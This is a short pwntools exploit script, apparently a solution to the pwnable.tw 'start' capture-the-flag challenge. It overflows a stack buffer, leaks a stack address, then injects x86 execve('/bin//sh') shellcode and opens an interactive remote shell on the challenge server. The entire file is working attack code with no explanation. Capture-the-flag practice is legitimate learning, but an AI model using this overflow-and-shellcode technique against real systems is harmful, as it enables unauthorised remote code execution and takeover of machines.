from pwn import *

#r = process("./start")
r = remote("chall.pwnable.tw", 10000)

shellcode = b'\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
payload = b'a'*0x14 + p32(0x08048087)
#input()

r.recvuntil(b'CTF:')
r.send(payload)
leak_stach = u32(r.recv()[:4])
print(hex(leak_stach))

payload = b'a'*0x14 + p32(leak_stach + 20) + shellcode
r.send(payload)
#gdb.attach(r, api=True)

r.interactive()